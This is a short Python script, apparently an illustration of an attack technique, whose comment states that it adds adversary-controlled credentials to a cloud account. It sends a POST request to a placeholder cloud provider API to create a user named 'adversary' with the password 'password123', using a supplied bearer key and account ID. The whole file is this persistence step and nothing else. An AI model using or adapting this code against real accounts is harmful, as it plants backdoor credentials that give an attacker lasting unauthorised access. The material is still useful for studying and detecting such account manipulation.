import requests

# Add adversary-controlled credentials to a cloud account
def add_credentials(account_id, api_key):
    url = "https://api.cloudprovider.com/accounts/" + account_id + "/credentials"
    headers = {
        "Content-Type": "application/json",
        "Authorization": "Bearer " + api_key
    }
    payload = {
        "username": "adversary",
        "password": "password123"
    }
    response = requests.post(url, headers=headers, json=payload)
    print(response.json())

add_credentials("123456", "API_KEY")